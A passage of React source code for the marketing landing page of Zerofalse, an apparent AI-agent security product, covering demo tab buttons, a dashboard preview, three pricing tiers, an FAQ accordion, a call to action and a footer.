              <button onClick={() => setDemoTab('safe')} style={{ padding: '8px 16px', fontSize: '12px', fontWeight: 500, border: `1px solid ${demoTab === 'safe' ? '#1a56ff' : '#e2e8f0'}`, borderRadius: '8px', background: demoTab === 'safe' ? '#eff4ff' : 'white', color: demoTab === 'safe' ? '#1a56ff' : '#64748b', cursor: 'pointer' }}>✓ Safe Example</button>
              <button onClick={() => setDemoTab('attack')} style={{ padding: '8px 16px', fontSize: '12px', fontWeight: 500, border: `1px solid ${demoTab === 'attack' ? '#ef4444' : '#e2e8f0'}`, borderRadius: '8px', background: demoTab === 'attack' ? '#fef2f2' : 'white', color: demoTab === 'attack' ? '#ef4444' : '#64748b', cursor: 'pointer' }}>⚠ Attack Example</button>
            </div>
          </div>
        </div>
      </section>

      {/* SECTION C: Dashboard Preview */}
      <section ref={dashboardRef} style={{ padding: '96px 24px', background: 'linear-gradient(180deg, #f0f4ff 0%, #ffffff 100%)' }}>
        <div style={{ maxWidth: '1000px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '48px' }}>
            <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.12em', color: '#1a56ff', fontWeight: 700, marginBottom: '12px' }}>PRODUCT PREVIEW</div>
            <h2 style={{ fontSize: '40px', fontWeight: 700, color: '#0f172a', marginBottom: '12px' }}>See threats stopped in real time</h2>
            <p style={{ fontSize: '18px', color: '#64748b' }}>Your actual dashboard after integrating Zerofalse.</p>
          </div>
          <div className="animate-on-scroll" style={{ display: 'flex', justifyContent: 'center' }}>
            <DashboardPreview />
          </div>
        </div>
      </section>

      {/* SECTION D: Pricing */}
      <section style={{ padding: '96px 24px', background: 'white' }}>
        <div style={{ maxWidth: '1000px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '40px' }}>
            <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.12em', color: '#1a56ff', fontWeight: 700, marginBottom: '12px' }}>PRICING</div>
            <h2 style={{ fontSize: '40px', fontWeight: 700, color: '#0f172a', marginBottom: '12px' }}>Simple, transparent pricing</h2>
            <p style={{ fontSize: '18px', color: '#64748b', marginBottom: '24px' }}>Start free. Scale as you grow. No hidden fees, no per-seat pricing.</p>
            <div style={{ display: 'inline-flex', background: '#f1f5f9', padding: '4px', borderRadius: '9999px', gap: '2px' }}>
              <button onClick={() => setBillingCycle('monthly')} style={{ padding: '8px 20px', fontSize: '14px', fontWeight: 500, border: 'none', borderRadius: '9999px', background: billingCycle === 'monthly' ? 'white' : 'transparent', boxShadow: billingCycle === 'monthly' ? '0 1px 3px rgba(0,0,0,0.1)' : 'none', color: billingCycle === 'monthly' ? '#0f172a' : '#64748b', cursor: 'pointer' }}>Monthly</button>
              <button onClick={() => setBillingCycle('annual')} style={{ padding: '8px 20px', fontSize: '14px', fontWeight: 500, border: 'none', borderRadius: '9999px', background: billingCycle === 'annual' ? 'white' : 'transparent', boxShadow: billingCycle === 'annual' ? '0 1px 3px rgba(0,0,0,0.1)' : 'none', color: billingCycle === 'annual' ? '#0f172a' : '#64748b', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '8px' }}>
                Annual {billingCycle === 'annual' && <span style={{ fontSize: '11px', background: '#10b981', color: 'white', padding: '2px 8px', borderRadius: '9999px' }}>Save 20%</span>}
              </button>
            </div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '20px' }}>
            {/* Free */}
            <div className="animate-on-scroll stagger-1" style={{ border: '1px solid #e2e8f0', borderRadius: '16px', padding: '32px' }}>
              <div style={{ fontSize: '14px', fontWeight: 700, color: '#64748b', marginBottom: '8px' }}>Free</div>
              <div style={{ fontSize: '48px', fontWeight: 800, color: '#0f172a' }}>$0</div>
              <div style={{ fontSize: '14px', color: '#94a3b8', marginBottom: '20px' }}>/month forever</div>
              <div style={{ height: '1px', background: '#f1f5f9', margin: '20px 0' }} />
              {['10,000 scans per month', '3 agents', 'Prompt injection detection', 'Tool call inspection', 'Community support'].map((f, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                  <Check style={{ width: '16px', height: '16px', color: '#10b981' }} />
                  <span style={{ fontSize: '14px', color: '#374151' }}>{f}</span>
                </div>
              ))}
              <Link to="/signup" style={{ display: 'block', textAlign: 'center', padding: '12px', border: '1px solid #e2e8f0', borderRadius: '10px', fontSize: '14px', fontWeight: 600, color: '#0f172a', textDecoration: 'none', marginTop: '24px' }}>Get Started Free</Link>
            </div>
            {/* Starter */}
            <div className="animate-on-scroll stagger-2" style={{ border: '2px solid #1a56ff', borderRadius: '16px', padding: '32px', boxShadow: '0 8px 30px rgba(26,86,255,0.15)', marginTop: '-12px', position: 'relative' }}>
              <div style={{ position: 'absolute', top: '-14px', left: '50%', transform: 'translateX(-50%)', background: '#1a56ff', color: 'white', fontSize: '11px', fontWeight: 700, padding: '4px 14px', borderRadius: '9999px', letterSpacing: '0.06em' }}>MOST POPULAR</div>
              <div style={{ fontSize: '14px', fontWeight: 700, color: '#1a56ff', marginBottom: '8px' }}>Starter</div>
              <div style={{ fontSize: '48px', fontWeight: 800, color: '#0f172a' }}>${billingCycle === 'annual' ? '399' : '499'}</div>
              <div style={{ fontSize: '14px', color: '#94a3b8', marginBottom: billingCycle === 'annual' ? '4px' : '20px' }}>/month</div>
              {billingCycle === 'annual' && <div style={{ fontSize: '12px', color: '#10b981', marginBottom: '16px' }}>Save $1,200/year</div>}
              <div style={{ height: '1px', background: '#f1f5f9', margin: '20px 0' }} />
              {['1,000,000 scans per month', '10 agents', 'All detection engines', 'Memory firewall', 'Credential scanner', 'Webhook alerts', '90-day history', 'Email support'].map((f, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                  <Check style={{ width: '16px', height: '16px', color: '#1a56ff' }} />
                  <span style={{ fontSize: '14px', color: '#374151' }}>{f}</span>
                </div>
              ))}
              <Link to="/signup" style={{ display: 'block', textAlign: 'center', padding: '12px', background: '#1a56ff', borderRadius: '10px', fontSize: '14px', fontWeight: 600, color: 'white', textDecoration: 'none', marginTop: '24px', boxShadow: '0 4px 14px rgba(26,86,255,0.3)' }}>Start Free Trial</Link>
            </div>
            {/* Growth */}
            <div className="animate-on-scroll stagger-3" style={{ border: '1px solid #e2e8f0', borderRadius: '16px', padding: '32px' }}>
              <div style={{ fontSize: '14px', fontWeight: 700, color: '#64748b', marginBottom: '8px' }}>Growth</div>
              <div style={{ fontSize: '48px', fontWeight: 800, color: '#0f172a' }}>${billingCycle === 'annual' ? '1,599' : '1,999'}</div>
              <div style={{ fontSize: '14px', color: '#94a3b8', marginBottom: '20px' }}>/month</div>
              <div style={{ height: '1px', background: '#f1f5f9', margin: '20px 0' }} />
              {['10,000,000 scans per month', 'Unlimited agents', 'Agent-to-agent verification', 'MCP security proxy', 'SSO / SAML', '1-year history', 'Slack support', 'SOC2 Type II report'].map((f, i) => (
                <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                  <Check style={{ width: '16px', height: '16px', color: '#10b981' }} />
                  <span style={{ fontSize: '14px', color: '#374151' }}>{f}</span>
                </div>
              ))}
              <a href="#contact" style={{ display: 'block', textAlign: 'center', padding: '12px', border: '1px solid #e2e8f0', borderRadius: '10px', fontSize: '14px', fontWeight: 600, color: '#0f172a', textDecoration: 'none', marginTop: '24px' }}>Contact Sales</a>
            </div>
          </div>
        </div>
      </section>

      {/* SECTION E: FAQ */}
      <section style={{ padding: '80px 24px', background: '#f8fafc' }}>
        <div style={{ maxWidth: '720px', margin: '0 auto' }}>
          <div className="animate-on-scroll" style={{ textAlign: 'center', marginBottom: '48px' }}>
            <h2 style={{ fontSize: '36px', fontWeight: 700, color: '#0f172a', marginBottom: '12px' }}>Frequently asked questions</h2>
            <p style={{ fontSize: '18px', color: '#64748b' }}>Everything developers ask before integrating.</p>
          </div>
          <div>
            {faqItems.map((item, i) => (
              <div key={i} className="animate-fade-left animate-on-scroll" style={{ borderBottom: '1px solid #e2e8f0' }}>
                <button onClick={() => setOpenFaq(openFaq === i ? null : i)} style={{ width: '100%', display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '20px 0', background: 'none', border: 'none', cursor: 'pointer', textAlign: 'left' }}>
                  <span style={{ fontSize: '16px', fontWeight: 600, color: '#0f172a' }}>{item.q}</span>
                  <ChevronDown style={{ width: '20px', height: '20px', color: '#94a3b8', transition: 'transform 0.2s ease', transform: openFaq === i ? 'rotate(180deg)' : 'rotate(0)' }} />
                </button>
                <div style={{ maxHeight: openFaq === i ? '500px' : '0', overflow: 'hidden', transition: 'max-height 0.3s ease' }}>
                  <p style={{ fontSize: '15px', color: '#475569', lineHeight: 1.75, paddingBottom: '20px' }}>{item.a}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* SECTION F: Final CTA */}
      <section style={{ background: 'linear-gradient(135deg, #0d1f3c 0%, #1e3a5f 100%)', padding: '96px 24px', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
        <div style={{ position: 'absolute', top: '-100px', left: '-100px', width: '400px', height: '400px', background: 'rgba(26,86,255,0.15)', borderRadius: '50%', filter: 'blur(80px)' }} />
        <div style={{ position: 'absolute', bottom: '-80px', right: '-80px', width: '300px', height: '300px', background: 'rgba(139,92,246,0.1)', borderRadius: '50%', filter: 'blur(60px)' }} />
        <div style={{ position: 'relative', zIndex: 1 }}>
          <h2 className="animate-on-scroll" style={{ fontSize: '48px', fontWeight: 800, color: 'white', maxWidth: '600px', margin: '0 auto 20px', lineHeight: 1.1 }}>Your AI agents are running. Are they secure?</h2>
          <p className="animate-on-scroll" style={{ color: 'rgba(255,255,255,0.7)', fontSize: '18px', maxWidth: '440px', margin: '0 auto 40px' }}>Start protecting your agents in under 10 minutes. No infrastructure changes required.</p>
          <div className="animate-on-scroll" style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap' }}>
            <Link to="/signup" style={{ padding: '14px 28px', background: 'white', color: '#0d1f3c', borderRadius: '10px', fontSize: '16px', fontWeight: 700, textDecoration: 'none', transition: 'all 0.2s ease' }}>Start Free — No Card</Link>
            <a href="#docs" style={{ padding: '14px 28px', background: 'transparent', color: 'white', border: '1px solid rgba(255,255,255,0.3)', borderRadius: '10px', fontSize: '16px', fontWeight: 700, textDecoration: 'none' }}>Read the Docs</a>
          </div>
          <div className="animate-on-scroll" style={{ marginTop: '32px', fontSize: '14px', color: 'rgba(255,255,255,0.5)' }}>
            No credit card required · 10,000 free scans · Cancel anytime
          </div>
        </div>
      </section>

      {/* SECTION G: Footer */}
      <footer style={{ background: '#0a1628', padding: '64px 24px 0' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', display: 'grid', gridTemplateColumns: '1.5fr 1fr 1fr 1fr', gap: '48px' }}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px' }}>
              <Shield style={{ width: '18px', height: '18px', color: 'white' }} />
              <span style={{ fontSize: '18px', fontWeight: 700, color: 'white' }}>Zerofalse</span>
            </div>
            <p style={{ fontSize: '14px', color: 'rgba(255,255,255,0.5)', marginBottom: '20px' }}>Runtime security for AI agents.</p>
            <div style={{ display: 'flex', gap: '12px' }}>
              {[Github, Twitter, Linkedin].map((Icon, i) => (
                <a key={i} href="#" style={{ width: '36px', height: '36px', background: 'rgba(255,255,255,0.08)', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', transition: 'background 0.15s' }}
                  onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.15)'}
                  onMouseLeave={e => e.currentTarget.style.background = 'rgba(255,255,255,0.08)'}>
                  <Icon style={{ width: '18px', height: '18px', color: 'rgba(255,255,255,0.6)' }} />
                </a>
              ))}
            </div>
          </div>
          {[
            { title: 'Product', links: ['Features', 'Pricing', 'Documentation', 'Changelog', 'Status'] },
            { title: 'Resources', links: ['SDK Reference', 'API Reference', 'Integration Guide', 'Security', 'Blog'] },
            { title: 'Company', links: ['About', 'Careers', 'Privacy Policy', 'Terms of Service', 'Contact'] }
          ].map((col, i) => (
            <div key={i}>
              <div style={{ fontSize: '11px', textTransform: 'uppercase', letterSpacing: '0.1em', color: 'rgba(255,255,255,0.4)', marginBottom: '16px' }}>{col.title}</div>
              {col.links.map((link, j) => (
                <a key={j} href="#" style={{ display: 'block', fontSize: '14px', color: 'rgba(255,255,255,0.6)', marginBottom: '10px', textDecoration: 'none', transition: 'color 0.15s' }}
                  onMouseEnter={e => e.currentTarget.style.color = 'white'}
                  onMouseLeave={e => e.currentTarget.style.color = 'rgba(255,255,255,0.6)'}>{link}</a>
              ))}
            </div>
          ))}
        </div>
        <div style={{ borderTop: '1px solid rgba(255,255,255,0.08)', marginTop: '48px', padding: '24px 0', display: 'flex', justifyContent: 'space-between', maxWidth: '1200px', margin: '48px auto 0' }}>
          <span style={{ fontSize: '14px', color: 'rgba(255,255,255,0.4)' }}>© 2026 Zerofalse, Inc. All rights reserved.</span>
          <span style={{ fontSize: '12px', color: 'rgba(255,255,255,0.3)' }}>Made with Emergent</span>
        </div>
      </footer>
    </div>
  );
};

export default Landing;
